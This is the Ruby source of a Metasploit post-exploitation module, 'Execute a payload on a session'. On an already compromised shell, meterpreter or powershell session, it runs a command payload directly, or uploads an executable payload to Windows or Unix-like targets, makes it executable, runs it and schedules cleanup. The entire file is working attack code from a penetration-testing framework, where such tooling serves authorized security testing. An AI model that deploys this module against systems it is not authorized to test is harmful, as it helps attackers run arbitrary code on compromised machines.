##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Execute a payload on a session',
        'Description' => %q{
          This module attempts to Execute a payload on a given session if possible.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Nick Cottrell'
        ],
        'Platform' => [ 'linux', 'unix', 'bsd', 'solaris', 'windows' ],
        'Arch' => ARCH_ALL,
        'SessionTypes' => [ 'shell', 'meterpreter', 'powershell' ],
        'DisclosureDate' => '2016-04-30',
        'Privileged' => false,
        'Targets' => [['Automatic', {}]],
        'Notes' => {
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        }
      )
    )
  end

  def exploit
    if payload.arch.first == 'cmd'
      vprint_line(payload.encoded)
      print_line(cmd_exec(payload.encoded))
    elsif session.platform == 'windows'
      upload_and_chmodx('payload.exe', generate_payload_exe)
      register_file_for_cleanup('payload.exe')
      print_line(cmd_exec('payload.exe'))
    else
      upload_and_chmodx('payload', generate_payload_exe)
      register_file_for_cleanup('payload')
      print_line(cmd_exec('./payload'))
    end
  end
end
